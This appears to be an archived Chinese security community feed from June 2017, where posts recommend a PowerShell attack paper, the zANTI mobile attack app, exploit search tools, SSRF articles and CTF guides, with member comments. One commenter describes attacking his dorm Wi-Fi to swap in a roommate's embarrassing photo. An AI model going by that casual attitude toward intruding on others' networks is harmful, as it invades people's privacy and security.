推荐这篇来自赛门铁克的 Paper，这是一篇难得攻防介绍很全面的研究成果，从 PowerShell 基础到各攻击阶段的姿势：

执行策略

植入
- 如：Email、Office 宏、Exploit Kits、横向渗透、策略文件、任务计划、PsExec、等

持久化
- 如：注册表、WMI、任务计划、启动目录、组策略、策略文件、等

混淆
- 如：大小写、空格、Get-自动补全、System.自动补全、引号拼接、反单引魔法、通配符魔法、别名、向后兼容、进制转换、-f格式化、XOR、BrainFuck、等

一些绕过技巧

在列举这些攻击过程的同时还举例了一些经典木马的案例，最后还好些篇幅介绍了防御姿势。

这篇 Paper 是去年的，如果能通读下来并做些实践，会很受益。

昨天我带团队通读了一遍，对于团队来说两块很明显的收益：英文能力提升、PowerShell 攻防姿势提升。

PowerShell 已经成为玩渗透必备技能，如果你还没掌握，赶快入坑。😏


__分享文件:__
[increased-use-of-powershell-in-attacks-16-en.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 感觉时间不够用，一天72小时吧😠

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年开始，(null)   就一直喊我学 PowerShell，只要和我见面必然会 Show 他的成果，还给我分享了各种环境、工具及学习笔记。可我当时并不以为然啊，Python 与 JavaScript 是我最好的武器，在我的工作场景下基本通杀全栈，我觉得够了，没想到，PowerShell 已经吐火如茶成这样，果然是老司机的建议，咱都收...

<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 吐火如茶？如火如荼？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: 哈，手快敲错

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 话说通杀是什么意思。。👀

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 自带混淆这个不错。

<img src="https://file.xiaomiquan.com/b2/27/b2273c727cd42d41352bd2bb195a82e4d41270073f0e99e7e46ffb1a1566c21f.jpg" width="25px"/> __。__: 各大杀软已经把恶意调用powershell加入黑名单了…真的厉害😂过段时间应该会有人在xx大会上分享powershell了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:


__#资源#__

  Debian Linux 9(Stretch) 发布

细节：
[Download of The Day: Debian Linux 9 ( Stretch ) – ...](https://www.cyberciti.biz/linux-news/download-debian-9-cd-dvd-iso-images/)

 

玩 Debian 操作系统的同学可以好好体验体验了。

<img src="https://images.xiaomiquan.com/Fkj1sDavUTkN3oSqnx0G3_V30tq5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lN9PJMP7zicCZA8tZIWfNgHBIr0=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:

凌晨玩了个“黑客风”小游戏，停不下来了……非常有意思：
[ZType – Typing Game - Type to Shoot](http://zty.pe/)



<img src="https://images.xiaomiquan.com/FncFD9jEVvZ7BTiA7ZLDxYw1t9ou?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:EJtLRLlSKvqnidHVIt-YDkIYr3g=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/2d/fa/2dfa44ebe22af926ef335d82bc7fc9e103953d5b1b1bc223fc4ab3363ed12fd2.jpg" width="25px"/> __Banana's__: 哈哈好玩好玩，在电脑上完更爽了

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 经常这么晚睡吗？

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 原来昨天晚上在玩这游戏啊😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 不经常

<img src="https://file.xiaomiquan.com/9a/eb/9aeb9f216088fef3ec00e50c57e8a8f58e84c440af8945093ca469021371ea1a.jpg" width="25px"/> __函数~__: 为什么叫黑客风？😳☞不只是一个打字游戏？😂是挺好玩的

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 莫名的酸爽

<img src="https://file.xiaomiquan.com/1f/94/1f94da2eeb0dc62d310f71b39b6c7bc6763324ffce638c47ee4573c61e04475a.jpg" width="25px"/> __溯流__: 哈哈，确实很爽


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:


__#工具#__

  内网渗透神器 App：zANTI 2.5.0 下载

刚刚看到 zANTI 的这篇文章：


[zANTI APK 2.5.0 Download For Android 2017 - Zanti ...](http://zantiapk.com/zanti-apk/)

 

介绍了 2.5.0 的下载，特性如下：

Hijack HTTP session.
Audit passwords.
MIMT(Man in the middle attack)
Network scanning.
Capture downloads.
Exploit routers.
MAC address spoofing.
Create a fake wifi hotspot.
Modify HTTP request.

我玩黑手（黑客手机）必定会安装 zANTI，这在做内网的渗透，尤其是自动主机及端口扫描，爆破，一些漏洞利用，路由器攻击，中间人劫持，Wi-Fi 伪造等方面，非常方便。

如果你有安卓手机，可以安装一个体验体验，需要 root。

<img src="https://images.xiaomiquan.com/Fi34-cbHoXhVOAxFlCxN--CjE5NN?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:OLaYLTc5o1l4q1AHyuJwhYB235c=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/75/6a/756acb550cacfeba3cc6bbcc099e2ca1be93b14eec71750d9028d2bdb6f06c64.jpg" width="25px"/> __扶苏__: 学习了

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 玩过一下

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: Fing也不错

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 最近新换了一个手机，一加3t，之前听说这个可以刷kali官方推送的nethunter的rom包，然后就自己折腾了一下把它刷到手机上，这个app让我联想到了kali的这款rom，具体参考freebuf:

[移动渗透测试平台搭建 – NetHunter 3.0 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/sectool/124074.html)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: Nethunter强大多了

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 回去买一加3T😉

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 昨天稍微玩了一下，把我们宿舍的wifi给黑了，把图片替换为我们宿舍一哥们只穿内裤时的图片。。只是一不小心把自己的手机给攻击了，某些应用连不上网，只能重新刷了一遍系统，真是折腾

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: 怎么会需要重装？

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 试过重启路由器没用，用4g网也没用，重启手机也没用，只能重新刷一下系统了哎~不过还好之前刷过机，一会儿就搞定了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__: ...缓存估计

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 嗯，这个我也想到了，只是手机没有清理缓存的软件，应用也装不了(T＿T)，就重刷了

<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 去年想研究NetHunter，当时一加只出到2,买回来是刷上了，不过Type-C连接外置网卡研究了很久都没成功过，有倒过此坑的同学吱个声哈

<img src="https://file.xiaomiquan.com/04/dd/04ddf1425dfc92d843c3e92ca271410f1cead17d4c375db2a4bc20d54753de00.jpg" width="25px"/> __丹青__ replies to <img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 刷成功了，只是某些东西还不太会配置。。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:


__#工具#__

  推荐 katoolin 快速安装 Kali 任意工具


[GitHub - LionSec/katoolin: Automatically install a...](https://github.com/LionSec/katoolin)

 

Ubuntu 下体验还不错，看源码可以发现是添加了 Kali 的源，然后 apt-get install 安装。

有时候我们的 VPS 是 Ubuntu，想快速安装一些 Kali 里的好工具，就用 katoolin 即可。

BTW：很多开源工具都是 Python 写的，我们在用爽的同时不妨学习下其源码，如果发现 bug 还可以去对应的 GitHub 上提交修正。这种互动很值得鼓励。

<img src="https://images.xiaomiquan.com/FtLBOd503NNTsOrwDZWvfpyYT-Tf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7VBoWHu9g1ANgaguRGMOKa5Kyq4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 这个刚好有需要

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 这个确实不错。曾经就想着直接在Ubuntu里面用工具


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:


__#工具#__

  推荐 katoolin 快速安装 Kali 任意工具


[GitHub - LionSec/katoolin: Automatically install a...](https://github.com/LionSec/katoolin)

 

Ubuntu 下体验还不错，看源码可以发现是添加了 Kali 的源，然后 apt-get install 安装。

有时候我们的 VPS 是 Ubuntu，想快速安装一些 Kali 里的好工具，就用 katoolin 即可。

BTW：很多开源工具都是 Python 写的，我们在用爽的同时不妨学习下其源码，如果发现 bug 还可以去对应的 GitHub 上提交修正。这种互动很值得鼓励。

<img src="https://images.xiaomiquan.com/FtLBOd503NNTsOrwDZWvfpyYT-Tf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7VBoWHu9g1ANgaguRGMOKa5Kyq4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 这个刚好有需要

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 这个确实不错。曾经就想着直接在Ubuntu里面用工具


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-17:


__#工具#__

  getsploit

本圈嘉宾@Moriarty  的分享。

getsploit

这是我用过的，迄今为止最好用的exploit搜索工具。首先，它支持在线搜索，它的exploit来自于 Exploit-DB, Metasploit, Packetstorm等等，并保持同步更新。它另一个更贴心的功能是可以指定-m参数，将搜索到的exploit自动下载下来（很方便的说）。另外它也支持离线，你只需要指定-u参数（--update），就可以将完整的exploit库离线到本地(目前数量大概在2亿2千万左右）。

项目地址：


[GitHub - vulnersCom/getsploit: Command line utilit...](https://github.com/vulnersCom/getsploit)



<img src="https://images.xiaomiquan.com/Fkbxi6FZacx-3UZORwxONU-uQ5Gg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ckq-otnhitV3uiFizc_geTk-EHE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FsrNMbhyZwPf5xtBMWsZPkpo8mbW?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:4bUuRoqH28JiuV3VWJ2uSdjs8jI=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: Python2.7.*内置sqlite3 并不支持FTS4 得下sqlite和Python源码编译 离线查询还得再折腾一下

<img src="https://file.xiaomiquan.com/48/65/48656b94e9e7832ed91ddb18cd8a7113a76b326cdbee625bccf6d77054dc1838.jpg" width="25px"/> __~~__: searchsploit也很好用啊，本身就是exploit-db的离线版，当然也支持查exploit的链接，也可以随时update

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/65/48656b94e9e7832ed91ddb18cd8a7113a76b326cdbee625bccf6d77054dc1838.jpg" width="25px"/> __~~__: 这个还包括其他db

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 居然有2亿多记录？？

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 我想问下载那么多会不会给电脑带来压力……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 另一个类似的：
[GitHub - 1N3/Findsploit: Find exploits in local an...](https://github.com/1N3/Findsploit)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 不会吧


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-17:

> 匿名用户 提问：
余弦你好，我在体制内工作近十年，从事运维岗，日常windows打补丁，linux改配置，路由也管过，网站也调过，有C编程基础。想离开体制，投身信息安全。本科研究生都是安全相关的，但工作的稳定带来的是，技术老化不进步，依赖工具。真的想离开，做自己想做的，又怕出去了，外面根本不是我想象中的。真诚请教三个问题：1.年龄是不是一个门槛，看到许多招聘都是3到5年经验的。2.从技术转销售，或者技术支持，是否可行？3.以你的经验，35岁的安全人应该怎么发展？谢谢


理解你的心情，做这行，30 岁就算是一个坎，而立之年，成家立业。如果技术想不被淘汰，这个年龄的人回头看看自己的技术是否真的不错，未来是否还能再干 10 年技术。

否则，很多人还是会转型，做更合适的职业，但是很多人忽略一点以为技术有沉淀了，说转销售或技术支持就转，殊不知每个职业都有自己的“技术”，比如优秀的销售，你去看看问问那些做销售 10 年的，他们如何沉淀销售技能的，他们如何给一个企业一个团队带来稳定合作的。销售做不好，前得罪客户，后得罪一帮产品技术，双方都会骂销售不靠谱，这个即使跳槽了，圈内口碑是会传播的。

所以，这样看来想做好，没有什么职业是简单的，都是需要很多年的沉淀。

最关键的是认清自己，多和身边的优秀人碰撞，也可以尝试尝试。35 岁其实正处于男人魅力大爆发年纪阶段。加油。



...

<img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__: 真心感谢你的留言。每个人的境遇不一样，只能靠自己做判断，冷暖自知，愿赌服输。你在圈里见识广，有高度，阅人无数，想多问一句：安全圈里，人过而立之年后，大家都怎么发展的？创业应该是少数，多数都干嘛去了？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-17:

> 匿名用户 提问：
我想问的是，一个好的安全团队，健康的安全团队应该是怎么样的呢？从分工，分享知识到团队协作我都想了解。我现在的情况是在一个小公司4，5个做渗透这块的小伙伴，一直处在一个好像自己做自己的事情的状态，配合度很低，然后没有感觉到共同进步的那种感觉和氛围。而且大家水平都差不多，一般般这样。我虽然没在安全团队待过，但是我也知道现在这种状态有点浪费时间的感觉，还是和自己在家做渗透是一个样子。我想请教一下，要怎么样才能把团队提升起来呢？要怎么样才会有那种健康成长的感觉呢。🙏🙏谢谢


几个点：

1. 首先得有个不错的 Leader，“兵熊熊一个，将熊熊一窝”，这个 Leader 技术水平要很高，经验要很丰富，否则怎么带动这支作战队伍？当然如果技术不那么高也可以，只是要服人吧？都是要么以武服人，要么以德服人，武不行，德总得让大家知道跟着他干，有肉吃。

2. 这 4/5 人小团队，大家技能必须是有互补的，渗透领域要的技能那么多（看看之前发的“洛马七步杀”），大家技能互补了，自然能协作起来。

3. 氛围这东西，有时候真看人，比如你说大家水平都差不多，一般般这样，那么大家有没有愿意一起去学习一起去交流，主动的，而不是被动的，如果团队里有那种需要被动推进的人，还是开掉吧，这种人并不是真的适合这个活。因为现在，真的不缺主动干活的人。



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-16:


__#资源#__

 Toolkit Prep | CTF Field Guide

玩 CTF 的同学可以看看这个 Guide，挺不错的指南，技能要求比较全面。包括：源码、二进制、Web 漏洞挖掘及利用方式；取证；工具准备；相关练习等：

链接：
[Introduction | CTF Field Guide](https://trailofbits.github.io/ctf/)





---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-16:


__#资源#__

  玩 CTF 的同学可以看看 Google CTF


[https://g.co/ctf](https://g.co/ctf)



奖金池：USD$31,337，TOP10 的队伍可以到 Google 参与决赛。

这机会很赞。

<img src="https://images.xiaomiquan.com/FrgYe0ZRaa6AxlQf6TNpqRQ-mIjR?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:nETN6YJDgpNBuGnEY2qaDejxUU0=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 短域名不错：g.co/ctf

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 😄


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-15:


__#姿势#__

  如何进行服务端请求伪造(SSRF)

这篇文章推荐大家看看：


[How To: Server-Side Request Forgery (SSRF) | Hacke...](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)

 

可以了解到的知识点：SSRF、Ruby 样例、nc 反弹、一些 bypass、内网端口扫描技巧、跨协议技巧，等。

这篇文章英文很简单，没多少生僻的词。

关于 SSRF 这个攻击，我算是很早就玩进去的人了，2013/2/11-12 的记录可以参考我的文章：


[SSRF – EVILCOS](http://evilcos.me/?tag=ssrf)



欢迎学习的同学互动。

<img src="https://images.xiaomiquan.com/Fo498jUdBZl2YT2nuFyvXrtqkOqX?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:O9Wuo-265vSzHLvimgBXt4k9J0M=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 最终 还是用了 翻译😌

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: Cos请问python爬虫框架除了Scrapy还有其他框架推荐的木，爬的目的是为了接下来漏扫= =，电脑上的小蜜圈，似乎不好提问所以就在这下面提了= =sorry

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 没用过其他的，就是scrapy吧 非常不错了

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: okay

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: scrapy，很好用，线程池、任务调度、网络接口都写好了，用户只要写业务代码就能搞定

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 不知道为什么riyazwalikar的域名解析出错，但是找到了中文版
[[安全科普]SSRF攻击实例解析 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/web/20407.html)



<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 补发一个昨天看到的经典例子
[Python安全 - 从SSRF到命令执行惨案 | 离别歌](https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 嗯很经典


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-14:


__#福利#__

  第三届中国移动互联网测试开发大会

测试开发相关的，我看了下质量不错，创办人邀请我去做个安全测试方面的分享，不过今年我不打算出去分享，后来拿到了两张票，准备做为福利送给本圈的同学。

7.15 在北京举办，具体细节看这：


[第三届中国移动互联网测试开发大会 -百格活动](http://www.bagevent.com/event/394956)



票只有两张，优先送给北京的同学吧，谁需要评论里说下，手快者拿，请珍惜，别浪费了。



...

<img src="https://file.xiaomiquan.com/87/b2/87b217dbd34242e97b5f6a7a29bcc77846a20a135c5f3f4202ef559f56cfd0c3.jpg" width="25px"/> __刘二和__: 弦哥，我在北京

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 可惜在深圳

<img src="https://file.xiaomiquan.com/f4/8a/f48a9a75747df8c1d7007d92d14ce161cfb6c950627b0478a854a96b9ee104ff.jpg" width="25px"/> __PattyBug™__: 我在北京😋

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 可以前往哟，求票

<img src="https://file.xiaomiquan.com/c0/51/c0513f154d8fcf23c3ec6bb33344fc7bdfab86a329522922281e5290731ec0a0.jpg" width="25px"/> __沉着__: 我在北京~不过我好像来晚了。。。😓

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 你们可以讨论下吧，是否真去，真去，票就给手快的同学吧

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 真来，请假都来

<img src="https://file.xiaomiquan.com/64/78/6478c53b7ce3530d1a74526571c996d829dc7e030a044113d9dcfc277d356ca1.jpg" width="25px"/> __宫崎没有骏__: 我在北京~

<img src="https://file.xiaomiquan.com/da/b6/dab69aac677723417e6dd4669c128b0fcb3476d48d21c01263daa3c71025e669.jpg" width="25px"/> __萝卜D__: 是不是来晚了，想去。。

